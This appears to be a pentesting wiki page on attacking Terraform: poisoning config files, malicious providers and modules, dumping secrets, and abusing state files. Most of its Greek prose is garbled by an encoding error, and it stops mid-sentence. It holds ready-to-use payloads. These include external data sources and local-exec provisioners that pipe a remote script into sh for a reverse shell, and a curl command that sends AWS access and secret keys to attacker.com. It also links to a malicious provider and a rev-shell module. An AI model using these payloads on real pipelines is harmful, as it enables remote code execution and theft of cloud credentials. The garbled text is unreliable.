# Terraform Î‘ÏƒÏ†Î¬Î»ÎµÎ¹Î±

{{#include ../banners/hacktricks-training.md}}

## Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

[From the docs:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Ï…Ï€Î¿Î´Î¿Î¼Î®Ï‚ Ï‰Ï‚ ÎºÏÎ´Î¹ÎºÎ± Ï€Î¿Ï… ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± Î¿ÏÎ¯Î¶ÎµÏ„Îµ Ï€ÏŒÏÎ¿Ï…Ï‚ ÏƒÏ„Î¿ cloud ÎºÎ±Î¹ on-prem ÏƒÎµ Î±ÏÏ‡ÎµÎ¯Î± Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚ Î±Î½Î±Î³Î½ÏÏƒÎ¹Î¼Î± Î±Ï€ÏŒ Î¬Î½Î¸ÏÏ‰Ï€Î¿ Ï„Î± Î¿Ï€Î¿Î¯Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Ï‡ÎµÏ„Îµ Î¼Îµ Î­ÎºÎ´Î¿ÏƒÎ·, Î½Î± ÎµÏ€Î±Î½Î±Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ ÎºÎ±Î¹ Î½Î± Î¼Î¿Î¹ÏÎ¬Î¶ÎµÏƒÏ„Îµ. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± ÏƒÏ…Î½ÎµÏ€Î® ÏÎ¿Î® ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ Î³Î¹Î± Î½Î± Ï€ÏÎ¿Î¼Î·Î¸ÎµÏÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏƒÏ„Îµ ÏŒÎ»Î· Ï„Î·Î½ Ï…Ï€Î¿Î´Î¿Î¼Î® ÏƒÎ±Ï‚ ÎºÎ±Î¸â€™ ÏŒÎ»Î· Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Î¶Ï‰Î®Ï‚ Ï„Î·Ï‚. Î¤Î¿ Terraform Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï‡Î±Î¼Î·Î»Î¿Ï ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ compute, storage ÎºÎ±Î¹ networking resources, ÎºÎ±Î¸ÏÏ‚ ÎºÎ±Î¹ Ï…ÏˆÎ·Î»Î¿Ï ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ DNS entries ÎºÎ±Î¹ SaaS features.

#### Î ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï„Î¿ Terraform;

Î¤Î¿ Terraform Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ ÎºÎ±Î¹ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï€ÏŒÏÎ¿Ï…Ï‚ ÏƒÎµ cloud Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼ÎµÏ‚ ÎºÎ±Î¹ Î¬Î»Î»ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ APIs Ï„Î¿Ï…Ï‚. ÎŸÎ¹ providers ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ ÏƒÏ„Î¿ Terraform Î½Î± Î´Î¿Ï…Î»ÎµÏÎµÎ¹ Î¼Îµ ÏƒÏ‡ÎµÎ´ÏŒÎ½ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î± Î® Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î¼Îµ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î¿ API.

![](<../images/image (177).png>)

Î— HashiCorp ÎºÎ±Î¹ Î· ÎºÎ¿Î¹Î½ÏŒÏ„Î·Ï„Î± Ï„Î¿Ï… Terraform Î­Ï‡Î¿Ï…Î½ Î®Î´Î· Î³ÏÎ¬ÏˆÎµÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ¿Ï…Ï‚ Î±Ï€ÏŒ 1700 providers Î³Î¹Î± Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î¿ÏÎ½ Ï‡Î¹Î»Î¹Î¬Î´ÎµÏ‚ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¿ÏÏ‚ Ï„ÏÏ€Î¿Ï…Ï‚ Ï€ÏŒÏÏ‰Î½ ÎºÎ±Î¹ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½, ÎºÎ±Î¹ Î±Ï…Ï„ÏŒÏ‚ Î¿ Î±ÏÎ¹Î¸Î¼ÏŒÏ‚ ÏƒÏ…Î½ÎµÏ‡Î¯Î¶ÎµÎ¹ Î½Î± Î±Ï…Î¾Î¬Î½ÎµÏ„Î±Î¹. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ Î´Î·Î¼ÏŒÏƒÎ¹Î± Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿Ï…Ï‚ providers ÏƒÏ„Î¿ [Terraform Registry](https://registry.terraform.io/), ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Ï‰Î½ Ï„Ï‰Î½ Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, ÎºÎ±Î¹ Ï€Î¿Î»Î»ÏÎ½ Î¬Î»Î»Ï‰Î½.

ÎŸ Î²Î±ÏƒÎ¹ÎºÏŒÏ‚ ÎºÏÎºÎ»Î¿Ï‚ ÎµÏÎ³Î±ÏƒÎ¹ÏÎ½ Ï„Î¿Ï… Terraform Î±Ï€Î¿Ï„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„ÏÎ¯Î± ÏƒÏ„Î¬Î´Î¹Î±:

- **Write:** ÎŸÏÎ¯Î¶ÎµÏ„Îµ Ï€ÏŒÏÎ¿Ï…Ï‚, Î¿Î¹ Î¿Ï€Î¿Î¯Î¿Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÏƒÎµ Ï€Î¿Î»Î»Î±Ï€Î»Î¿ÏÏ‚ cloud providers ÎºÎ±Î¹ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Î³Î¹Î± Ï„Î·Î½ Î±Î½Î¬Ï€Ï„Ï…Î¾Î· Î¼Î¹Î±Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ ÏƒÎµ virtual machines Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± Virtual Private Cloud (VPC) Î¼Îµ security groups ÎºÎ±Î¹ load balancer.
- **Plan:** Î¤Î¿ Terraform Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î± execution plan Ï€Î¿Ï… Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÎ¹ Ï„Î·Î½ Ï…Ï€Î¿Î´Î¿Î¼Î® Ï€Î¿Ï… Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹, Î¸Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÎ¹ Î® Î¸Î± ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î·Î½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± Ï…Ï€Î¿Î´Î¿Î¼Î® ÎºÎ±Î¹ Ï„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ® ÏƒÎ±Ï‚.
- **Apply:** ÎœÎµ Î­Î³ÎºÏÎ¹ÏƒÎ·, Ï„Î¿ Terraform ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¹Ï‚ Ï€ÏÎ¿Ï„ÎµÎ¹Î½ÏŒÎ¼ÎµÎ½ÎµÏ‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Î¼Îµ Ï„Î· ÏƒÏ‰ÏƒÏ„Î® ÏƒÎµÎ¹ÏÎ¬, ÏƒÎµÎ²ÏŒÎ¼ÎµÎ½Î¿ Ï„Ï…Ï‡ÏŒÎ½ ÎµÎ¾Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Ï€ÏŒÏÏ‰Î½. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Î½ ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Î¹Î´Î¹ÏŒÏ„Î·Ï„ÎµÏ‚ ÎµÎ½ÏŒÏ‚ VPC ÎºÎ±Î¹ Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î¿Î½ Î±ÏÎ¹Î¸Î¼ÏŒ Ï„Ï‰Î½ virtual machines ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ VPC, Ï„Î¿ Terraform Î¸Î± Î±Î½Î±Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï„Î¿ VPC Ï€ÏÎ¹Î½ ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎµÎ¹ Ï„Î± virtual machines.

![](<../images/image (215).png>)

### Terraform Lab

Î‘Ï€Î»ÏÏ‚ ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÏ„Îµ Ï„Î¿ terraform ÏƒÏ„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® ÏƒÎ±Ï‚.

Here you have a [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) and here you have the [best way to download terraform](https://www.terraform.io/downloads).

## RCE in Terraform: config file poisoning

Terraform **doesn't have a platform exposing a web page or a network service** we can enumerate, therefore, the only way to compromise terraform is to **be able to add/modify terraform configuration files** or to **be able to modify the terraform state file** (see chapter below).

However, terraform is a **very sensitive component** to compromise because it will have **privileged access** to different locations so it can work properly.

The main way for an attacker to be able to compromise the system where terraform is running is to **compromise the repository that stores terraform configurations**, because at some point they are going to be **interpreted**.

Actually, there are solutions out there that **execute terraform plan/apply automatically after a PR** is created, such as **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

If you are able to compromise a terraform file there are different ways you can perform RCE when someone executed `terraform plan` or `terraform apply`.

### Terraform plan

Terraform plan ÎµÎ¯Î½Î±Î¹ Î· **Ï€Î¹Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½Ï„Î¿Î»Î®** ÏƒÏ„Î¿ terraform ÎºÎ±Î¹ developers/solutions Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ terraform Ï„Î·Î½ ÎºÎ±Î»Î¿ÏÎ½ ÏƒÏ…Î½ÎµÏ‡ÏÏ‚, Î¿Ï€ÏŒÏ„Îµ Î¿ **Ï€Î¹Î¿ ÎµÏÎºÎ¿Î»Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î½Î± Ï€ÎµÏ„ÏÏ‡ÎµÏ„Îµ RCE** ÎµÎ¯Î½Î±Î¹ Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¯ÏƒÎµÏ„Îµ ÏŒÏ„Î¹ Î¸Î± Î¼Î¿Î»ÏÎ½ÎµÏ„Îµ (poison) Î­Î½Î± terraform config file Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ arbitrary ÎµÎ½Ï„Î¿Î»Î­Ï‚ ÏƒÎµ Î­Î½Î± `terraform plan`.

**Using an external provider**

Î¤Î¿ Terraform Ï€ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ Ï„Î¿Î½ [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î´Î¹ÎµÏ€Î±Ï†Î®Ï‚ Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… Terraform ÎºÎ±Î¹ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÏÎ½ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î¬Ï„Ï‰Î½. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ `external` data source Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ arbitrary code ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± ÎµÎ½ÏŒÏ‚ `plan`.

Injecting in a terraform config file something like the following will execute a rev shell when executing `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Î§ÏÎ®ÏƒÎ· ÎµÎ½ÏŒÏ‚ custom provider**

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÎ¹ Î­Î½Î±Î½ [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) ÏƒÏ„Î¿ [Terraform Registry](https://registry.terraform.io/) ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Ï„Î¿Î½ Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Terraform ÏƒÎµ Î­Î½Î± feature branch ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
ÎŸ provider ÎºÎ±Ï„ÎµÎ²Î±Î¯Î½ÎµÎ¹ ÏƒÏ„Î¿ `init` ÎºÎ±Î¹ Î¸Î± Ï„ÏÎ­Î¾ÎµÎ¹ Ï„Î¿Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÎºÏÎ´Î¹ÎºÎ± ÏŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Ï„Î¿ `plan`

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÏƒÏ„Î¿ [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Î§ÏÎ®ÏƒÎ· ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ®Ï‚ Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚**

ÎšÎ±Î¹ Î¿Î¹ Î´ÏÎ¿ Î±Î½Î±Ï†ÎµÏÎ¸ÎµÎ¯ÏƒÎµÏ‚ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼ÎµÏ‚ Î±Î»Î»Î¬ ÏŒÏ‡Î¹ Ï€Î¿Î»Ï Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ­Ï‚ (Î· Î´ÎµÏÏ„ÎµÏÎ· ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¿ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ® Î±Î»Î»Î¬ Ï€Î¹Î¿ Ï€ÎµÏÎ¯Ï€Î»Î¿ÎºÎ· Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÏÏ„Î·). ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î¼Îµ Î±ÎºÏŒÎ¼Î± Ï€Î¹Î¿ **Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ** Ï„ÏÏŒÏ€Î¿, Î±ÎºÎ¿Î»Î¿Ï…Î¸ÏÎ½Ï„Î±Ï‚ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€ÏÎ¿Ï„Î¬ÏƒÎµÎ¹Ï‚:

- Î‘Î½Ï„Î¯ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î¿ rev shell Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ terraform, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ Î­Î½Î±Î½ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÏŒ Ï€ÏŒÏÎ¿** Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿ rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
You can find the rev shell code in [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- Î£Ï„Î¿ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÏŒ resource, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± **ref** Î³Î¹Î± Î½Î± ÎºÏÏÏˆÎµÏ„Îµ Ï„Î¿ **terraform rev shell code in a branch** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ repo, ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± ÎµÏ†Î±ÏÎ¼ÏŒÏƒÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î±Î»Î»Î±Î³Î­Ï‚ â€” Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï„Î¿ ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ RCE ÎµÎ¹ÏƒÎ¬Î³Î¿Î½Ï„Î±Ï‚ **Î­Î½Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Terraform Î¼Îµ** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Î‘Ï€Î»ÏÏ‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î²ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ ÎºÎ¬Ï€Î¿Î¹Î¿ payload ÏŒÏ€Ï‰Ï‚ Ï„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÎ±Ï„Î±Î»Î®Î³ÎµÎ¹ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Î‘ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎµ Ï„Î¹Ï‚ **Ï€ÏÎ¿Ï„Î¬ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Ï„ÎµÏ‡Î½Î¹ÎºÎ®** Î³Î¹Î± Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î¼Îµ Ï€Î¹Î¿ **Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ Ï„ÏÏŒÏ€Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ Î±Î½Î±Ï†Î¿ÏÎ­Ï‚**.

## Secrets Dumps

ÎœÏ€Î¿ÏÎµÎ¯Ï‚ Î½Î± ÎºÎ¬Î½ÎµÎ¹Ï‚ Ï„Î¹Ï‚ **Ï„Î¹Î¼Î­Ï‚ Î¼Ï…ÏƒÏ„Î¹ÎºÏÎ½ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ terraform Î½Î± ÎµÎ¾Î±Ï‡Î¸Î¿ÏÎ½** ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ `terraform apply` Ï€ÏÎ¿ÏƒÎ¸Î­Ï„Î¿Î½Ï„Î±Ï‚ ÏƒÏ„Î¿ terraform Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½ state Ï„Î¿Ï… Terraform

Î£Îµ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ Ï€Î¬Î½Ï‰ ÏƒÎµ Î±ÏÏ‡ÎµÎ¯Î± state Ï„Î¿Ï… Terraform Î±Î»Î»Î¬ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î¿Ï… Terraform, [**this research**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) Î´Î¯Î½ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎµÏ‚ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ Î³Î¹Î± Î½Î± Î±Î¾Î¹Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿. Î‘ÎºÏŒÎ¼Î· ÎºÎ¹ Î±Î½ Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¯Ï‰Î¼Î± ÎµÎ³Î³ÏÎ±Ï†Î®Ï‚ ÏƒÏ„Î± config Î±ÏÏ‡ÎµÎ¯Î±, Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… vector Ï„Ï‰Î½ state Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Ï‡Î½Î¬ Ï€Î¿Î»Ï Ï€Î¹Î¿ ÏÏ€Î¿Ï…Î»Î·, ÎµÏ€ÎµÎ¹Î´Î® Î´ÎµÎ½ Î±Ï†Î®Î½ÎµÏ„Îµ Î¯Ï‡Î½Î· ÏƒÏ„Î¿ Î¹ÏƒÏ„Î¿ÏÎ¹ÎºÏŒ Ï„Î¿Ï… `git`.

### RCE in Terraform: config file poisoning

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± [create a custom provider](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) ÎºÎ±Î¹ Î±Ï€Î»Î¬ Î½Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ providers ÏƒÏ„Î¿ terraform state file Î¼Îµ Ï„Î¿Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ Î® Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Î­Î½Î± ÏˆÎµÏÏ„Î¹ÎºÎ¿ resource Ï€Î¿Ï… Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏƒÏ„Î¿Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ provider.

ÎŸ provider [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) Î²Î±ÏƒÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ Î­ÏÎµÏ…Î½Î± ÎºÎ±Î¹ ÎµÎ¾Î¿Ï€Î»Î¯Î¶ÎµÎ¹ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î±ÏÏ‡Î®. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Î­Î½Î± ÏˆÎµÏÏ„Î¹ÎºÎ¿ resource ÎºÎ±Î¹ Î½Î± Î´Î·Î»ÏÏƒÎµÏ„Îµ Ï„Î·Î½ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· bash ÎµÎ½Ï„Î¿Î»Î® Ï€Î¿Ï… Î¸Î­Î»ÎµÏ„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ ÏƒÏ„Î¿ attribute `command`. ÎŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ `terraform` run, Î±Ï…Ï„ÏŒ Î¸Î± Î´Î¹Î±Î²Î±ÏƒÏ„ÎµÎ¯ ÎºÎ±Î¹ Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Ï„ÏŒÏƒÎ¿ ÏƒÏ„Î¿ `terraform plan` ÏŒÏƒÎ¿ ÎºÎ±Î¹ ÏƒÏ„Î¿ `terraform apply`. Î£Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï„Î¿Ï… `terraform apply`, Ï„Î¿ `terraform` Î¸Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î¿ ÏˆÎµÏÏ„Î¹ÎºÎ¿ resource Î±Ï€ÏŒ Ï„Î¿ state file 